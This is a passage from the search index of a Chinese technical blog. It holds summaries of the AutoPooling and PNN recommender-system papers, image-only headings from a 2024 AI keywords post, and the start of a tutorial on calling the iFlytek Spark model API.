src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_zR0vT7dcgY.png"></p><h2 id="5-5-智能体基准评估"><a href="#5-5-智能体基准评估" class="headerlink" title="5.5 智能体基准评估"></a>5.5 智能体基准评估</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_PzF4jVYVtw.png"></p><h2 id="5-6-长期记忆"><a href="#5-6-长期记忆" class="headerlink" title="5.6 长期记忆"></a>5.6 长期记忆</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_wN_Nr_8Evt.png"></p><h2 id="5-7-自我进化"><a href="#5-7-自我进化" class="headerlink" title="5.7 自我进化"></a>5.7 自我进化</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_z74LYMlT8s.png"></p><hr><h1 id="6-端侧智能"><a href="#6-端侧智能" class="headerlink" title="6 端侧智能"></a>6 端侧智能</h1><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_H61YX9gkjL.png"></p><h2 id="6-1-极限压缩"><a href="#6-1-极限压缩" class="headerlink" title="6.1 极限压缩"></a>6.1 极限压缩</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_FE4Vzsp1vY.png"></p><h2 id="6-2-端侧多模态"><a href="#6-2-端侧多模态" class="headerlink" title="6.2 端侧多模态"></a>6.2 端侧多模态</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_okrcK9BccV.png"></p><h2 id="6-3-端侧-Agents"><a href="#6-3-端侧-Agents" class="headerlink" title="6.3 端侧 Agents"></a>6.3 端侧 Agents</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_bFqrf3UZUc.png"></p><h2 id="6-4-AI-芯片"><a href="#6-4-AI-芯片" class="headerlink" title="6.4 AI 芯片"></a>6.4 AI 芯片</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_d1Qj2JGmaR.png"></p><h2 id="6-5-读屏操作"><a href="#6-5-读屏操作" class="headerlink" title="6.5 读屏操作"></a>6.5 读屏操作</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_Pd7XKzVZcF.png"></p><h2 id="6-6-端云协同"><a href="#6-6-端云协同" class="headerlink" title="6.6 端云协同"></a>6.6 端云协同</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_tPzQJh5yxV.png"></p><h2 id="6-7-隐私计算"><a href="#6-7-隐私计算" class="headerlink" title="6.7 隐私计算"></a>6.7 隐私计算</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_8vsIVen51l.png"></p><hr><h1 id="7-具身智能"><a href="#7-具身智能" class="headerlink" title="7 具身智能"></a>7 具身智能</h1><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_8y1fxusW22.png"></p><h2 id="7-1-人形机器人"><a href="#7-1-人形机器人" class="headerlink" title="7.1 人形机器人"></a>7.1 人形机器人</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_uLkIrVOWQV.png"></p><h2 id="7-2-机器人供应链"><a href="#7-2-机器人供应链" class="headerlink" title="7.2 机器人供应链"></a>7.2 机器人供应链</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_vfK_c-udGY.png"></p><h2 id="7-3-空间智能"><a href="#7-3-空间智能" class="headerlink" title="7.3 空间智能"></a>7.3 空间智能</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_KvrVeRplLn.png"></p><h2 id="7-4-机器人商业闭环"><a href="#7-4-机器人商业闭环" class="headerlink" title="7.4 机器人商业闭环"></a>7.4 机器人商业闭环</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_fwVPwrEa9w.png"></p><h2 id="7-5-运动控制"><a href="#7-5-运动控制" class="headerlink" title="7.5 运动控制"></a>7.5 运动控制</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_6MxQ3EX8Ym.png"></p><h2 id="7-6-Sim2Real"><a href="#7-6-Sim2Real" class="headerlink" title="7.6 Sim2Real"></a>7.6 Sim2Real</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_MZtFpHX5a_.png"></p><h2 id="7-7-共创平台"><a href="#7-7-共创平台" class="headerlink" title="7.7 共创平台"></a>7.7 共创平台</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_Xhp1acCzP7.png"></p><hr><h1 id="8-基础模型"><a href="#8-基础模型" class="headerlink" title="8 基础模型"></a>8 基础模型</h1><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_5RIWv6gp7D.png"></p><h2 id="8-1-Scaling-Law"><a href="#8-1-Scaling-Law" class="headerlink" title="8.1 Scaling Law"></a>8.1 Scaling Law</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_2yhPYmdF0O.png"></p><h2 id="8-2-高级视频语音模式"><a href="#8-2-高级视频语音模式" class="headerlink" title="8.2 高级视频语音模式"></a>8.2 高级视频语音模式</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_I-ONfkClbm.png"></p><h2 id="8-3-满思考"><a href="#8-3-满思考" class="headerlink" title="8.3 满思考"></a>8.3 满思考</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_dffF5iI1Z9.png"></p><h2 id="8-4-合成数据"><a href="#8-4-合成数据" class="headerlink" title="8.4 合成数据"></a>8.4 合成数据</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_kdVsN_APBm.png"></p><h2 id="8-5-MoE-架构"><a href="#8-5-MoE-架构" class="headerlink" title="8.5 MoE 架构"></a>8.5 MoE 架构</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_yNo5UzDAfq.png"></p><h2 id="8-6-加速推理"><a href="#8-6-加速推理" class="headerlink" title="8.6 加速推理"></a>8.6 加速推理</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_KUTkDCEDCB.png"></p><h2 id="8-7-开源生态"><a href="#8-7-开源生态" class="headerlink" title="8.7 开源生态"></a>8.7 开源生态</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_P20X1a6G15.png"></p><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_4m90lUffHj.png"></p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>论文精读8：AutoPooling</title>
      <link href="/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/"/>
      <url>/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/</url>
      
        <content type="html"><![CDATA[<h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>推荐系统中有很多多值特征，文中假设所有特征字段都是多值的，定义为以下形式：</p><p><img src="/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/image_ohvY7U28lm.png"></p><p>传统的池化对所有特征使用统一的池化算子来压缩信息，忽略了特征分布之间的差异。因此，需要更多区分不同领域的池化方法。</p><p>因此提出了 AutoPooling 来自适应学习合适的池化算子，提升模型对于多值特征的学习能力。</p><hr><h1 id="2-AutoPooling"><a href="#2-AutoPooling" class="headerlink" title="2 AutoPooling"></a>2 AutoPooling</h1><p><img src="/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/image_qK16QAfnAV.png"></p><p>可以自动搜索每个特征的最佳池化算子，这个过程可以看作是搜索池化层的最佳子结构，这个子结构是搜索空间中预定义的池化算子。</p><p><img src="/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/image_9PbUh_6R_U.png"></p><p>AutoPooling（图 1 的上半部分）为池化层构建了一个池化算子搜索空间 $\mathscr{P}$，并设计了一种搜索策略来为每个字段找到最佳搜索空间。所以，最佳子结构的搜索转换为架构参数的搜索。通过这种方式，将各种池化层集成到加权和中：</p><p><img src="/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/image_UGld8oCzQZ.png"></p><p>通过优化架构参数 $\alpha$ 找到最佳池化算子。</p><p>AutoPooling 使用两阶段的方法进行训练，分为搜索阶段和重训练阶段（AP-2stage）。</p><h2 id="2-1-搜索阶段"><a href="#2-1-搜索阶段" class="headerlink" title="2.1 搜索阶段"></a>2.1 搜索阶段</h2><p>将整个系统的参数分为超参数 $\alpha$ 和模型可学习的参数 $W$，搜索阶段的主要目的是得到超参数 $\alpha$ 的较优值。使用可微架构搜索 (DARTS) 技术。根据 DARTS，可以优化训练集中的主网络参数 $W$，并在验证集上优化架构参数 $\alpha$。</p><p>因此将损失函数定义为两部分：训练集的损失 $\mathcal{L}<em>{\text {train }}(W, \boldsymbol{\alpha})$ 和验证集的损失 $\mathcal{L}</em>{v a l}(\boldsymbol{\alpha}, W(\boldsymbol{\alpha}))$，其中 $W(\boldsymbol{\alpha})$ 表示固定 $\alpha $ 后的网络参数 $W$。</p><p><img src="/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/image_AY7Ouj8GLb.png"></p><p>直接对公式11进行求解计算代价比较高，因此可以采用近似的方法：</p><p><img src="/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/image_N-9kL08XUb.png"></p><p>其中 $\beta$ 是学习率，整个过程描述如下：</p><p>输入：feature 和 label</p><p>输出：学习到的架构参数 $\alpha^{*}$</p><ul><li>若未收敛：<ol><li>获取一小批验证数据</li><li>通过下降 $\nabla \alpha \mathcal{L}_{v a l}\left(W^{*}, \alpha\right)$ 更新 $\alpha$</li><li>获取一小批训练数据</li><li>模型输出预测的值 $\hat{y}$</li><li>通过下降 $\nabla W \mathcal{L}_{\text {train }}(W, \alpha)$ 更新 $W$</li></ol></li></ul><p>训练结束后，为每一个特征选择权重最大的池化方法。</p><p><img src="/2025/01/22/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB8%EF%BC%9AAutoPooling/image_TJFCwNkHBn.png"></p><h2 id="2-2-重训练阶段"><a href="#2-2-重训练阶段" class="headerlink" title="2.2 重训练阶段"></a>2.2 重训练阶段</h2><p>基于上述训练得到的最优池化算子，重新训练模型参数。</p><p>可以发现，两阶段的方法是比较耗时的，在第二阶段只选择一个池化算子。在此基础上提出 AP-Hybrid 方法，</p><h2 id="2-3-AP-Hybrid"><a href="#2-3-AP-Hybrid" class="headerlink" title="2.3 AP-Hybrid"></a>2.3 AP-Hybrid</h2><p>AP-Hybrid 只执行 AP-2 阶段的第一阶段，仅将 Softmax 函数应用于等式 8。然后，APHybrid 在训练阶段结束时混合由 DARTS 过程（算法 1）优化的架构参数 $\alpha$。通过这种方式，AP-Hybrid 可以研究多值特征的分布，并自适应地混合来自不同池化算子的信息。</p><hr><h1 id="3-模型结构图"><a href="#3-模型结构图" class="headerlink" title="3 模型结构图"></a>3 模型结构图</h1><p>主要的改进是在池化层，因此可以很很方便的应用于不同的模型架构中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    subgraph 输入层</span><br><span class="line">        A1[单值特征&lt;br&gt;userId/movieId/year]</span><br><span class="line">        A2[多值特征&lt;br&gt;user_genre/urb/movie_genre/movie_tag]</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    subgraph Embedding层</span><br><span class="line">        B1[单值Embedding&lt;br&gt;size=16]</span><br><span class="line">        B2[多值Embedding&lt;br&gt;size=16]</span><br><span class="line">        A1 --&gt; B1</span><br><span class="line">        A2 --&gt; B2</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    subgraph 池化层</span><br><span class="line">        C1[多种池化方式]</span><br><span class="line">        C2[Sum池化]</span><br><span class="line">        C3[Mean池化]</span><br><span class="line">        C4[Max池化]</span><br><span class="line">        C5[Min池化]</span><br><span class="line">        C6[K阶池化]</span><br><span class="line">        C7[注意力池化]</span><br><span class="line">        B2 --&gt; C1</span><br><span class="line">        C1 --&gt; C2</span><br><span class="line">        C1 --&gt; C3</span><br><span class="line">        C1 --&gt; C4</span><br><span class="line">        C1 --&gt; C5</span><br><span class="line">        C1 --&gt; C6</span><br><span class="line">        C1 --&gt; C7</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    subgraph 权重融合</span><br><span class="line">        D1[Softmax权重]</span><br><span class="line">        D2[加权池化结果]</span><br><span class="line">        C2 &amp; C3 &amp; C4 &amp; C5 &amp; C6 &amp; C7 --&gt; D1</span><br><span class="line">        D1 --&gt; D2</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    subgraph DNN层</span><br><span class="line">        E1[特征拼接&lt;br&gt;单值+多值]</span><br><span class="line">        E2[FC层 64]</span><br><span class="line">        E3[FC层 32]</span><br><span class="line">        E4[FC层 1]</span><br><span class="line">        B1 --&gt; E1</span><br><span class="line">        D2 --&gt; E1</span><br><span class="line">        E1 --&gt; E2</span><br><span class="line">        E2 --&gt; E3</span><br><span class="line">        E3 --&gt; E4</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    subgraph 输出层</span><br><span class="line">        F1[Sigmoid]</span><br><span class="line">        F2[预测概率]</span><br><span class="line">        E4 --&gt; F1</span><br><span class="line">        F1 --&gt; F2</span><br><span class="line">    end</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AutoPooling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文精读7：PNN</title>
      <link href="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/"/>
      <url>/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font color=green><strong>论文题目</strong></font>：Product-based Neural Networks for User Response Prediction<br><font color=green><strong>作者</strong></font>：交大张伟楠老师及其合作者<br><font color=green><strong>发表时间</strong></font>：2016年</p></blockquote><h1 id="1-研究背景"><a href="#1-研究背景" class="headerlink" title="1 研究背景"></a>1 研究背景</h1><p>目前平台上的数据大部分是通过独热编码转换成高维稀疏二进制特征表示。对于这种极端的稀疏性数据，传统模型从数据中挖掘特征的能力较差。</p><p>PNN 论文是构建一个预测模型来估计用户在给定上下文中单击特定广告的概率。</p><p>例如当前的用户所处的场景是【星期日：周二，性别：男性，所在城市：伦敦】，那么可以使用独热编码表示为以下形式：</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_kmk9lp9WTu.png"></p><p>许多机器学习模型已经被提出来处理这种高维稀疏二元特征并有不错的效果，但是这种形式过度依赖特征工程来捕获高阶的潜在模式。可以使用 DNN 自动学习更具表现力的特征表示并提供更好的预测性能。</p><hr><h1 id="2-模型结构"><a href="#2-模型结构" class="headerlink" title="2 模型结构"></a>2 模型结构</h1><p>PNN 的模型结构图如下：</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_1VG7gXR7IN.png"></p><h2 id="2-1-输出层"><a href="#2-1-输出层" class="headerlink" title="2.1 输出层"></a>2.1 输出层</h2><p>从自顶向下的角度来看，PNN的输出是一个实数 $\hat{y} \in(0,1)$ 作为预测的CTR：</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_8hzCFurZV4.png"></p><p>其中 $\boldsymbol{W}_{3} \in \mathbb{R}^{1 \times D_{2}}$ 和 $b_{3} \in \mathbb{R}$ 是输出层的参数，$\boldsymbol{l}_{2} \in \mathbb{R}^{D_{2}}$ 是第二个隐藏层的输出，$σ(x)$ 是 <code>sigmoid</code> 激活函数：$σ(x) &#x3D;1 &#x2F;\left(1+e^{-x}\right)$。使用 $D_i$ 来表示第 $i$ 个隐藏层的维度。</p><h2 id="2-2-L2-层"><a href="#2-2-L2-层" class="headerlink" title="2.2 L2 层"></a>2.2 L2 层</h2><p>第二个隐藏层的输出 L2 构造为：</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_YIe_-LIMyU.png"></p><p>其中 $\boldsymbol{l}_{1} \in \mathbb{R}^{D_{1}}$ 是第一个隐藏层的输出。选择整流线性单元 (relu) 定义为 $\operatorname{relu}(x)&#x3D;\max (0, x)$ 作为隐藏层输出的激活函数，因为它具有出色的性能和高效计算。</p><h2 id="2-3-L1-层"><a href="#2-3-L1-层" class="headerlink" title="2.3 L1 层"></a>2.3 L1 层</h2><p>第一个隐藏层与 Product 层完全连接。它的输入由线性信号 $l_z$ 和二次信号 $l_p$ 组成。对于 $l_z$ 和 $l_p$ 输入，$l_1$ 的公式为：</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_llhiXHTaFM.png"></p><p>其中所有 $l_z$、$l_p$ 和偏置向量 $\boldsymbol{b}_{1} \in \mathbb{R}^{D_{1}}$。</p><h2 id="2-4-Product-层"><a href="#2-4-Product-层" class="headerlink" title="2.4 Product 层"></a>2.4 Product 层</h2><p>首先定义向量的内积操作如下：</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_Ar4902vB9r.png"></p><p>其中首先将逐元素乘法应用于 A、B，然后将乘法结果相加为标量。之后，$l_z$ 和 $l_p$ 分别通过 $z$ 和 $p$ 计算：</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_Y8e7BW73bz.png"></p><p>其中 $\boldsymbol{W}_{z}^{n}$ 和 $\boldsymbol{W}_{p}^{n}$ 是 Product 层中的权重，它们的形状分别由 $z$ 和 $p$ 决定。</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_o9x4hDP1Dj.png"></p><p>$z$ 和 $f$ 是相等的，这里的 $f$ 就是嵌入层的输出。PNN 模型可以通过为 $g$ 设计不同的操作来实现不同的实现，即 IPNN 和 OPNN。</p><p>最后，使用监督训练来最小化对数损失，这是一种广泛使用的目标函数，用于捕获两个概率分布之间的差异，其实就是交叉熵。</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_9T97pcZLgw.png"></p><hr><h1 id="3-IPNN"><a href="#3-IPNN" class="headerlink" title="3 IPNN"></a>3 IPNN</h1><p>在IPNN中，将成对特征交互定义为向量内积：$g\left(\boldsymbol{f}_{i}, \boldsymbol{f}_{j}\right)&#x3D; &lt;\boldsymbol{f}_i, \boldsymbol{f}_j&gt;$。之后使用常量“1”，线性信息 $z$ 计算如下：</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_DPfwdw86y3.png"></p><p>对于 $p$ 来说，$g\left(\boldsymbol{f}_{i}, \boldsymbol{f}_{j}\right)$ 的成对内积项形成一个方阵 $\mathbb{R}^{N \times N}$。回想一下式（5）中 $l_p$ 的定义，$l_p^n &#x3D; \sum_{i&#x3D;1}^{N} \sum_{j&#x3D;1}^{N}\left(\boldsymbol{W}_{p}^{n}\right)_{i, j} \boldsymbol{p}_{i, j}$ 和向量内积中的交换律 $p$ 和 $\boldsymbol{W}_{p}^{n}$ 应该是对称的。</p><hr><h1 id="4-OPNN"><a href="#4-OPNN" class="headerlink" title="4 OPNN"></a>4 OPNN</h1><p>IPNN 和 OPNN 之间的唯一区别是二次项 $p$ 的计算。在 OPNN 中，$g\left(\boldsymbol{f}_{i}, \boldsymbol{f}_{j}\right)&#x3D;\boldsymbol{f}_{i} \boldsymbol{f}_{j}^{T}$。因此，对于 $p$ 中的每个元素，$\boldsymbol{p}, \boldsymbol{p}_{i, j} \in \mathbb{R}^{M \times M}$ 是一个方阵。</p><p>在原文中对于 IPNN 和 OPNN 都对时间复杂度进行了优化，这里没有阐述~</p><hr><h1 id="5-讨论"><a href="#5-讨论" class="headerlink" title="5 讨论"></a>5 讨论</h1><p>可以先训练PNN的一部分（如FNN或FM部分）作为初始化，然后开始让反向传播覆盖整个网络。生成的PNN至少应该与FNN或FM一样好。</p><p>向量乘积可以看作是一系列加法&#x2F;乘法运算。内积和外积只是两种实现。事实上可以定义更通用或更复杂的产品层，在探索特征交互方面获得更好的 PNN 能力。</p><p>与电子电路类似，加法像“OR”门，而乘法像“AND”门，乘积层似乎学习特征以外的规则。回顾计算机视觉的场景，而图像中的像素是真实世界的原始特征，web应用程序中的分类数据是具有高层次和丰富含义的人工特征。逻辑是处理概念、领域和关系的强大工具。因此，在神经网络中引入乘积运算可以提高网络对多场分类数据建模的能力。</p><hr><h1 id="6-实验"><a href="#6-实验" class="headerlink" title="6 实验"></a>6 实验</h1><h2 id="6-1-评估指标"><a href="#6-1-评估指标" class="headerlink" title="6.1 评估指标"></a>6.1 评估指标</h2><ol><li>AUC：ROC曲线下的面积是评估分类问题中广泛使用的指标。此外，很多工作验证了 AUC 作为 CTR 估计的很有效的指标。</li><li>RIG：相对信息增益，RIG &#x3D; 1−NE，其中 NE 是归一化交叉熵。</li></ol><h2 id="6-2-实验结果"><a href="#6-2-实验结果" class="headerlink" title="6.2 实验结果"></a>6.2 实验结果</h2><p>表 I 和 II 中的总体结果表明：</p><ol><li>FM 优于 LR，证明了特征交互的有效性；</li><li>神经网络优于 LR 和 FM，这验证了高阶潜在模式的重要性；</li><li>PNN 在 Criteo 和 iPinYou 数据集上表现最好。至于RMSE 和 RIG，结果相似。</li></ol><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_dt8cwhhXib.png"></p><p>图 3 显示了 iPinYou 数据集上训练迭代的 AUC 性能。可以发现 PNN 模型比 LR 和 FM 收敛得更快。另外，两个 PNN 比其他网络模型具有更好的收敛性。</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_d8g_qRlRV1.png"></p><p>不同的 Dropout 参数对AUC 也有一定的影响，实验表明，当 Dropout 为0.5 时 AUC 最高。</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_MO97VVTuNy.png"></p><h2 id="6-3-消融实验"><a href="#6-3-消融实验" class="headerlink" title="6.3 消融实验"></a>6.3 消融实验</h2><h3 id="6-3-1-网络深度"><a href="#6-3-1-网络深度" class="headerlink" title="6.3.1 网络深度"></a>6.3.1 网络深度</h3><p>较了不同数量的隐藏层：1、3、5 和 7。图 4 显示了随着网络深度的增长的性能。一般来说，具有 3 个隐藏层的网络在测试集上具有更好的泛化能力。</p><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_-JOTfjeGmt.png"></p><h3 id="6-3-2-激活函数"><a href="#6-3-2-激活函数" class="headerlink" title="6.3.2 激活函数"></a>6.3.2 激活函数</h3><p>与 sigmoid 家族相比，relu 函数具有稀疏性和高效梯度的优点，可以在多分类数据上获得更多好处。</p><p>图 5 比较了 FNN、IPNN 和 OPNN 上的这些激活函数。可以发现 tanh 比 sigmoid 具有更好的性能。除了 tanh，我们发现 relu 函数也具有良好的性能。可能的原因包括：</p><ol><li>稀疏激活，输出为负的节点不会被激活；</li><li>高效的梯度传播，没有消失梯度问题或爆炸效应；</li><li>高效计算，仅比较、加法和乘法。</li></ol><p><img src="/2025/01/05/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB7%EF%BC%9APNN/image_k00AyGxKOF.png"></p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用大模型API生成摘要</title>
      <link href="/2024/12/12/%E4%BD%BF%E7%94%A8%E5%A4%A7%E6%A8%A1%E5%9E%8BAPI%E7%94%9F%E6%88%90%E6%91%98%E8%A6%81/"/>
      <url>/2024/12/12/%E4%BD%BF%E7%94%A8%E5%A4%A7%E6%A8%A1%E5%9E%8BAPI%E7%94%9F%E6%88%90%E6%91%98%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装环境"><a href="#1-安装环境" class="headerlink" title="1 安装环境"></a>1 安装环境</h1><p>首先安装 <code>PyPI</code> 上的包，在 python 环境中执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade spark_ai_python</span><br></pre></td></tr></table></figure><p>安装完成后，可以使用以下命令查看是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip show spark_ai_python</span><br></pre></td></tr></table></figure><p>如果安装成功，将看到该包的详细信息，包括版本号、安装位置等。</p><p><img src="/2024/12/12/%E4%BD%BF%E7%94%A8%E5%A4%A7%E6%A8%A1%E5%9E%8BAPI%E7%94%9F%E6%88%90%E6%91%98%E8%A6%81/image_jOT8lQMEM8.png"></p><p>上述结果显示安装成功。</p><hr><h1 id="2-获取调用密钥"><a href="#2-获取调用密钥" class="headerlink" title="2 获取调用密钥"></a>2 获取调用密钥</h1><p>在环境安装完成后，调用大模型 API 时需要使用密钥。打开<a href="https://console.xfyun.cn/services" title="讯飞开放平台控制台">讯飞开放平台控制台</a>。如果尚未登录，请先进行登录。</p><p>登录后，导航至 API 管理页面。创建一个新的应用，或者选择已有的应用。在应用详情页中，将看到相关的 API 密钥和其他配置信息。登录成功后的界面如下：</p><p><img 